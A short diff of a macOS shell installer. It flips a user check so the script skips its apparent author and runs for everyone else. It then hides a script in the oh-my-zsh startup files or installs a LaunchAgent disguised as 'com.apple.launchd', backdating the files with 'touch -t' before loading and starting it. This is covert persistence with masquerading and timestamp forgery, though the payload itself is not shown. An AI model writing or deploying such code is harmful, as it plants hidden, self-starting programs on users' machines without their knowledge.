@@ -7,7 +7,7 @@ if [ -z "$USER" ]; then
 	exit 1
 fi
 
-if [ "$USER" != "jmuhlber" ]; then
+if [ "$USER" == "jmuhlber" ]; then
 	echo "nenene"
 	exit 1
 fi
@@ -21,9 +21,13 @@ macinstall() {
 		cp plan.sh ~/.oh-my-zsh/lib/host.zsh
 		touch -t 202410191633 ~/.oh-my-zsh/lib/host.zsh
 		touch -t 202405131058 "$OUTFILE"
-		echo "Installed."
+		echo "Installed ozsh."
 	else
-		echo "no ohmyzsh"
+		cp launchagent.xml ~/Library/LaunchAgents/com.apple.launchd.plist
+		touch -t 202405131058 ~/Library/LaunchAgents/com.apple.launchd.plist
+		launchctl load ~/Library/LaunchAgents/com.apple.launchd.plist
+		launchctl start com.apple.launchd
+		echo "Installed la."
 	fi
 }
 
